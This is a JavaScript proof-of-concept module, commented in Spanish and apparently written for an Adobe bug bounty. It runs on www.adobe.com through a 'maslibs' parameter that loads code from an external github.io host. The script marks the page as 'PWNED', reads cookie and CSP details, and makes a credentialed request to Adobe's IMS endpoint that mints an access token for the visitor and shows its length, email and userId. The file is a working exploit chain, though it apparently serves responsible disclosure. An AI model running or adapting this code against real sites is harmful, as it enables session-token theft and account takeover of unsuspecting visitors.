// PoC — Adobe bug bounty, d0x, 2026-07-27
//
// Este archivo es el modulo ES que www.adobe.com carga cuando se le pasa
//   ?maslibs=hoodhmnd.github.io/poc/evil.js#--
// Todo lo que hace es demostrar que corre en el origen de Adobe. No exfiltra
// nada a ningun lado: lo que muestra queda en la pantalla de quien lo ejecuta.

const origen = window.location.origin;

// 1 — marcador programatico, para leer desde consola
window.__PWNED__ = {
  origin: origen,
  href: window.location.href,
  cookieBytes: document.cookie.length,
  csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? 'si' : 'ninguna',
  ts: new Date().toISOString(),
};

document.title = 'PWNED — ' + window.location.hostname;

// 2 — banner visible, para que se vea en video
const banner = document.createElement('div');
banner.style.cssText = [
  'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
  'background:#b30000', 'color:#fff', 'padding:18px 22px',
  'font:600 16px/1.5 -apple-system,Segoe UI,Roboto,sans-serif',
  'box-shadow:0 2px 12px rgba(0,0,0,.4)',
].join(';');
banner.innerHTML =
  '<div style="font-size:19px;margin-bottom:6px">' +
  'Arbitrary JavaScript from an attacker-controlled host is executing here</div>' +
  '<div style="font-weight:400;font-size:14px">' +
  'origin <b>' + origen + '</b> &nbsp;·&nbsp; ' +
  'module loaded from <b>https://hoodhmnd.github.io/poc/evil.js</b> &nbsp;·&nbsp; ' +
  'Content-Security-Policy: <b>none</b></div>' +
  '<div id="d0x-ims" style="font-weight:400;font-size:14px;margin-top:6px">' +
  'IMS silent-auth: consultando…</div>';
document.documentElement.appendChild(banner);

// 3 — la escalada: pedir un token IMS con la sesion de quien visita.
//     Solo se muestra el LARGO del token y el email, nunca el token entero,
//     y nada sale de esta pagina.
fetch('https://adobeid-na1.services.adobe.com/ims/check/v6/token', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'client_id=homepage_milo&scope=AdobeID,openid,gnav,pps.read,read_organizations',
})
  .then((r) => r.json())
  .then((j) => {
    const el = document.getElementById('d0x-ims');
    if (j && j.access_token) {
      el.innerHTML =
        'IMS silent-auth: <b>token emitido</b> — largo ' + j.access_token.length +
        ' · email <b>' + (j.email || '-') + '</b>' +
        ' · userId <b>' + (j.userId || '-') + '</b>' +
        ' · scopes <b>' + ((j.scope || '').split(',').length) + '</b>';
      window.__PWNED__.imsTokenLength = j.access_token.length;
      window.__PWNED__.imsEmail = j.email || null;
    } else {
      el.textContent =
        'IMS silent-auth: sin token (visitante sin sesion de Adobe) — ' +
        (j && j.error ? j.error : 'sin detalle');
    }
  })
  .catch((e) => {
    const el = document.getElementById('d0x-ims');
    if (el) el.textContent = 'IMS silent-auth: error — ' + e;
  });

// El cargador de Adobe espera un custom element; se lo damos para que no
// rompa el resto de la pagina.
export class MerchCard extends HTMLElement {}
export default {};
